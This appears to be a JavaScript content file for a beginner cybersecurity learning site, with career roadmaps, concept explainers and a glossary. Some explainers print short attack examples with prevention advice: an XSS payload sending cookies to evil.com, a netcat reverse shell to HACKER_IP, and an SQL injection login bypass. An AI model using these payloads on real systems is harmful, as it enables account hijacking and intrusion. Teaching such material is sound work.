// ── LEARNING CONTENT: Beginner-friendly guides, roadmaps, glossary ──

export const LEARNING_PATHS = [
  {
    id: "ethical-hacking",
    title: "Ethical Hacking",
    icon: "🎯",
    color: "#6C63FF",
    duration: "3-6 months",
    desc: "Learn how hackers think and how to find vulnerabilities ethically. Start from zero and build real skills.",
    steps: [
      { title: "Understand the Basics", desc: "Learn what hacking really means, types of hackers, and why ethical hacking is legal and important.", done: true },
      { title: "Networking Fundamentals", desc: "Learn how computers talk to each other — IP addresses, ports, protocols (TCP/UDP), DNS, HTTP.", done: true },
      { title: "Linux Basics", desc: "Most hacking tools run on Linux. Learn terminal commands, file permissions, and Kali Linux setup.", done: true },
      { title: "Reconnaissance", desc: "The first step in any hack — gathering information about a target using OSINT, Nmap, Whois.", done: false },
      { title: "Scanning & Enumeration", desc: "Find open ports, running services, and potential entry points using Nmap, Nikto, Gobuster.", done: false },
      { title: "Exploitation", desc: "Use tools like Metasploit to exploit known vulnerabilities. Understand payloads and shells.", done: false },
      { title: "Web App Hacking", desc: "Find bugs in websites — SQL injection, XSS, CSRF, IDOR. Use Burp Suite and OWASP ZAP.", done: false },
      { title: "Post-Exploitation", desc: "What happens after you get in — privilege escalation, persistence, data extraction.", done: false },
      { title: "Report Writing", desc: "Document your findings professionally. This is what separates a hacker from a security professional.", done: false },
      { title: "Get Certified", desc: "CEH, eJPT, OSCP — choose your certification path based on your career goals.", done: false },
    ]
  },
  {
    id: "soc-analyst",
    title: "SOC L1 Analyst",
    icon: "🛡️",
    color: "#00B4D8",
    duration: "2-4 months",
    desc: "Become a Security Operations Center analyst. Monitor networks, detect threats, and respond to incidents.",
    steps: [
      { title: "Security Fundamentals", desc: "CIA Triad, types of threats, attack vectors, defense-in-depth strategy.", done: true },
      { title: "Networking for SOC", desc: "TCP/IP, OSI model, firewalls, IDS/IPS, VPNs — what SOC analysts monitor daily.", done: true },
      { title: "SIEM Tools", desc: "Learn Splunk or QRadar — how to write queries, create dashboards, and set up alerts.", done: false },
      { title: "Log Analysis", desc: "Read and understand Windows Event Logs, Linux syslogs, firewall logs, and web server logs.", done: false },
      { title: "Threat Detection", desc: "Recognize brute-force attacks, port scans, malware beacons, data exfiltration patterns.", done: false },
      { title: "Incident Response", desc: "The 6 phases: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned.", done: false },
      { title: "Malware Basics", desc: "Types of malware, how they spread, basic static and dynamic analysis techniques.", done: false },
      { title: "Frameworks & Compliance", desc: "MITRE ATT&CK, NIST CSF, ISO 27001, PCI-DSS — industry standards you must know.", done: false },
      { title: "Hands-on Practice", desc: "Set up a home lab, practice with BlueTeam Labs, LetsDefend, and CyberDefenders.", done: false },
      { title: "Get Certified", desc: "CompTIA Security+, SC-200, BTL1 — certifications that get you hired as SOC L1.", done: false },
    ]
  },
  {
    id: "pentest",
    title: "Penetration Testing",
    icon: "💉",
    color: "#FF6B6B",
    duration: "6-12 months",
    desc: "Professional penetration testing — systematically test organizations for security weaknesses.",
    steps: [
      { title: "Pre-Engagement", desc: "Scope definition, rules of engagement, legal agreements, and authorization documents.", done: true },
      { title: "OSINT & Passive Recon", desc: "Gather intel without touching the target — Google dorks, Shodan, social media, DNS records.", done: true },
      { title: "Active Scanning", desc: "Network scanning with Nmap, web scanning with Nikto/Gobuster, vulnerability scanning.", done: false },
      { title: "Vulnerability Analysis", desc: "Identify and prioritize vulnerabilities. Understand CVSS scores and exploit databases.", done: false },
      { title: "Exploitation", desc: "Manual and automated exploitation. Buffer overflows, web app attacks, network attacks.", done: false },
      { title: "Password Attacks", desc: "Cracking, spraying, stuffing, hash dumping. Tools: Hashcat, John, Hydra, Responder.", done: false },
      { title: "Privilege Escalation", desc: "Linux: SUID, cron, capabilities. Windows: tokens, services, registry, UAC bypass.", done: false },
      { title: "Lateral Movement", desc: "Moving through the network — pass-the-hash, Kerberoasting, pivoting, tunneling.", done: false },
      { title: "Reporting", desc: "Executive summary, technical findings, risk ratings, remediation recommendations.", done: false },
      { title: "Certifications", desc: "eJPT (beginner), PNPT (intermediate), OSCP (gold standard) — your career roadmap.", done: false },
    ]
  }
];

export const BEGINNER_CONCEPTS = [
  {
    title: "What is Hacking?",
    icon: "🤔",
    color: "#6C63FF",
    content: `Hacking means finding weaknesses in computer systems. Think of it like this:

Imagine a building with 100 doors. The owner thinks all doors are locked. A hacker checks every door to find which ones are actually unlocked.

**Types of Hackers:**
• **White Hat** (Ethical) — Gets PERMISSION to hack. Finds bugs and reports them. Gets paid legally. This is what we teach here.
• **Black Hat** (Criminal) — Hacks WITHOUT permission. Steals data, money. Goes to JAIL.
• **Grey Hat** — Hacks without permission but doesn't cause harm. Still illegal.

**Why learn ethical hacking?**
→ Average salary: $95,000/year
→ Every company needs security experts
→ You literally get paid to hack legally
→ It's one of the most exciting tech careers`,
  },
  {
    title: "How Does a Hack Actually Work?",
    icon: "🔄",
    color: "#00B4D8",
    content: `Every hack follows these 5 steps. Let's use a real example — hacking into a vulnerable website:

**Step 1: Reconnaissance (Gathering Info)**
→ Find the target's IP address, technology stack, employee names
→ Like a thief studying a bank before robbing it
→ Tools: Google, Nmap, Shodan, LinkedIn

**Step 2: Scanning (Finding Doors)**
→ Scan for open ports and running services
→ Find outdated software with known vulnerabilities
→ Tools: Nmap, Nikto, Gobuster

**Step 3: Exploitation (Breaking In)**
→ Use the vulnerability to gain access
→ Example: SQL injection to bypass login, or Metasploit to exploit old software
→ Tools: Burp Suite, Metasploit, SQLMap

**Step 4: Maintaining Access**
→ Install a backdoor so you can come back later
→ Create hidden admin accounts
→ Tools: Reverse shells, Meterpreter

**Step 5: Covering Tracks**
→ Delete logs, hide your presence
→ Ethical hackers SKIP this — they want to be found (they write a report instead!)`,
  },
  {
    title: "What is a Port?",
    icon: "🚪",
    color: "#FF6B6B",
    content: `Think of a computer like an apartment building. The IP address is the building's street address. Ports are the apartment numbers.

Each port runs a different service:

**Common Ports You MUST Know:**
• Port 22 = SSH (Secure remote access — like a secure phone line)
• Port 80 = HTTP (Websites without encryption — anyone can read the data)
• Port 443 = HTTPS (Websites WITH encryption — data is scrambled)
• Port 21 = FTP (File transfer — old and often insecure)
• Port 3389 = RDP (Windows remote desktop — major target for hackers)
• Port 3306 = MySQL (Database — if exposed, hackers can steal all your data)
• Port 445 = SMB (Windows file sharing — WannaCry ransomware used this!)

**Why does this matter?**
→ Open ports = potential entry points for hackers
→ First thing a hacker does: scan for open ports
→ Security teams close unnecessary ports to reduce risk

There are 65,535 total ports on every computer!`,
  },
  {
    title: "What is SQL Injection?",
    icon: "💉",
    color: "#FFA62B",
    content: `SQL Injection is the #1 web attack. Here's how it works in plain English:

**Normal Login:**
You type: Username = admin, Password = mypassword
The website asks the database: "Is there a user called admin with password mypassword?"

**SQL Injection Attack:**
You type: Username = admin'-- , Password = (anything)
The website asks the database: "Is there a user called admin?" (the -- comments out the password check!)

**Result:** You're logged in as admin WITHOUT knowing the password! 😱

**Real SQL query:**
Normal: SELECT * FROM users WHERE user='admin' AND pass='mypassword'
Hacked: SELECT * FROM users WHERE user='admin'--' AND pass='anything'
(Everything after -- is ignored!)

**How to Prevent It:**
→ Use "parameterized queries" (separates code from data)
→ Never build SQL strings by concatenating user input
→ Use an ORM (Object-Relational Mapper)
→ Input validation and WAF (Web Application Firewall)

**This one attack has caused BILLIONS in damages worldwide.**`,
  },
  {
    title: "What is XSS (Cross-Site Scripting)?",
    icon: "📜",
    color: "#E056A0",
    content: `XSS is when a hacker injects JavaScript code into a website that OTHER users visit.

**Simple Example:**
A blog has a comment section. Instead of a normal comment, the hacker writes:
<script>document.location='http://evil.com/?cookie='+document.cookie</script>

**What happens:**
→ Every visitor who reads that comment runs the hacker's JavaScript
→ Their browser sends their session cookie to the hacker's server
→ The hacker uses that cookie to log in AS that user
→ If an admin visits, the hacker gets admin access!

**Types of XSS:**
• **Stored XSS** — Saved in database (comments, profiles). Most dangerous — affects ALL visitors
• **Reflected XSS** — In the URL. Victim must click a malicious link
• **DOM XSS** — Happens in browser-side JavaScript without server involvement

**How to Prevent:**
→ Encode all user output (convert < to &lt;)
→ Use Content Security Policy (CSP) headers
→ Never use innerHTML with user data
→ Use DOMPurify library to sanitize HTML`,
  },
  {
    title: "What is a Reverse Shell?",
    icon: "🐚",
    color: "#4ECDC4",
    content: `A reverse shell is how hackers get remote control of a computer after exploiting a vulnerability.

**Normal connection (Bind Shell):**
Hacker → connects TO → Victim's computer (port 4444)
Problem: Firewalls BLOCK incoming connections!

**Reverse Shell (the clever way):**
Victim's computer → connects BACK TO → Hacker's computer
Why it works: Firewalls usually ALLOW outgoing connections!

**How it works step by step:**
1. Hacker sets up a "listener" on their machine: nc -lvnp 4444
2. Hacker finds a vulnerability on the target (RCE, file upload, etc.)
3. Hacker makes the target run: nc HACKER_IP 4444 -e /bin/bash
4. Target connects BACK to hacker — hacker now has a terminal on the target!

**Real-world analogy:**
→ It's like calling someone's phone vs. making their phone call YOU
→ Security cameras watch who comes IN, not who goes OUT
→ That's why reverse shells bypass most firewalls

**This is why monitoring OUTBOUND traffic is crucial for defenders!**`,
  },
  {
    title: "What Does a SOC Analyst Do All Day?",
    icon: "👨‍💻",
    color: "#7B68EE",
    content: `SOC = Security Operations Center. Think of it as a security control room that monitors an organization 24/7.

**A Typical Day for SOC L1 Analyst:**

8:00 AM — Check SIEM dashboard for overnight alerts
8:30 AM — Investigate alert: "500 failed SSH logins from Russia"
→ Is it a brute-force attack? → YES → Block the IP, create incident ticket
9:00 AM — Review phishing email reported by employee
→ Check sender, links, attachments in sandbox → Confirm malicious → Block domain
10:00 AM — Analyze suspicious network traffic
→ Internal host sending data to unknown IP at 3 AM → Possible data exfiltration
11:00 AM — Update detection rules to catch new malware variant

**Key Skills Needed:**
→ Reading logs (Windows Event Logs, firewall logs, web server logs)
→ Using SIEM tools (Splunk, QRadar, Elastic)
→ Understanding network protocols
→ Knowing common attack patterns
→ Writing clear incident reports

**Entry Salary:** $55,000 - $75,000/year
**No degree required** — certifications + skills matter more!`,
  },
  {
    title: "Understanding the CIA Triad",
    icon: "🔺",
    color: "#FF8C42",
    content: `The CIA Triad is the FOUNDATION of all cybersecurity. Every security decision maps back to these three principles:

**C — Confidentiality** (Keep secrets secret)
→ Only authorized people can see the data
→ Example: Your bank password is confidential
→ Broken by: data breaches, shoulder surfing, unencrypted emails
→ Protected by: encryption, access controls, MFA

**I — Integrity** (Data hasn't been tampered with)
→ Data is accurate and hasn't been modified
→ Example: Your bank balance should be correct
→ Broken by: SQL injection modifying records, man-in-the-middle attacks
→ Protected by: hashing, digital signatures, checksums

**A — Availability** (Systems work when needed)
→ Services are up and running
→ Example: ATM machine must work 24/7
→ Broken by: DDoS attacks, ransomware, hardware failure
→ Protected by: redundancy, backups, load balancers, CDNs

**Interview Question:** "A hacker encrypts all company files with ransomware."
→ Which CIA principle is violated?
→ Answer: AVAILABILITY (and sometimes Confidentiality if data was stolen first)`,
  }
];

export const GLOSSARY = [
  { term: "IP Address", def: "A unique number that identifies every device on a network. Like a home address for computers. Example: 192.168.1.1" },
  { term: "Port", def: "A numbered endpoint on a computer where specific services listen. Port 80 = web, Port 22 = SSH. Total: 65,535 ports." },
  { term: "Firewall", def: "A security guard for your network. Decides what traffic can enter and leave. Can be hardware or software." },
  { term: "VPN", def: "Virtual Private Network. Creates an encrypted tunnel for your internet traffic. Hides your real IP address." },
  { term: "Malware", def: "Malicious software — any program designed to harm. Includes viruses, trojans, ransomware, worms, spyware." },
  { term: "Phishing", def: "Fake emails/websites that trick you into entering passwords or clicking malicious links. #1 attack vector." },
  { term: "Vulnerability", def: "A weakness in software or configuration that can be exploited. Like a crack in a wall." },
  { term: "Exploit", def: "Code or technique that takes advantage of a vulnerability. The tool that breaks through the crack." },
  { term: "Payload", def: "The code that runs AFTER an exploit succeeds. The exploit opens the door; the payload is what walks through." },
  { term: "Shell", def: "A command-line interface to control a computer. Getting a 'shell' means you can run commands on the target." },
  { term: "Privilege Escalation", def: "Going from a normal user to admin/root. Like finding the master key after entering through a window." },
  { term: "Lateral Movement", def: "Moving from one compromised computer to others on the same network. Spreading your access." },
  { term: "OSINT", def: "Open Source Intelligence. Finding information from public sources — Google, LinkedIn, social media, DNS records." },
  { term: "CVE", def: "Common Vulnerabilities and Exposures. A unique ID for each known vulnerability. Example: CVE-2021-44228 (Log4Shell)." },
  { term: "Zero-Day", def: "A vulnerability unknown to the software vendor with no patch available. Most dangerous and valuable type." },
  { term: "Brute Force", def: "Trying every possible password until one works. Like trying every key on a keyring." },
  { term: "Hash", def: "A one-way mathematical function that converts data to a fixed-size string. Used to store passwords securely." },
  { term: "Encryption", def: "Scrambling data so only authorized people can read it. Symmetric (one key) or Asymmetric (two keys)." },
  { term: "SIEM", def: "Security Information and Event Management. Collects logs from everywhere and alerts on suspicious patterns." },
  { term: "IOC", def: "Indicator of Compromise. Evidence that a system was hacked — malicious IPs, file hashes, suspicious domains." },
  { term: "Pentest", def: "Penetration Test. A simulated hack performed with permission to find vulnerabilities before real attackers do." },
  { term: "Red Team", def: "Offensive security team that simulates real attacks. They try to break in." },
  { term: "Blue Team", def: "Defensive security team that detects and responds to attacks. They try to keep attackers out." },
  { term: "CTF", def: "Capture The Flag. Hacking competitions where you solve security challenges to find hidden 'flags' (text strings)." },
  { term: "Sandbox", def: "An isolated environment for safely running suspicious files. Like a quarantine room for malware." },
  { term: "WAF", def: "Web Application Firewall. Filters HTTP traffic to block web attacks like SQL injection and XSS." },
  { term: "DDoS", def: "Distributed Denial of Service. Flooding a server with so much traffic it crashes. Uses thousands of compromised machines." },
  { term: "Ransomware", def: "Malware that encrypts your files and demands payment (usually Bitcoin) for the decryption key." },
  { term: "Social Engineering", def: "Manipulating people into breaking security rules. Phishing, pretexting, baiting, tailgating." },
  { term: "MFA / 2FA", def: "Multi-Factor Authentication. Requires 2+ proofs of identity (password + phone code). Blocks 99.9% of automated attacks." },
];
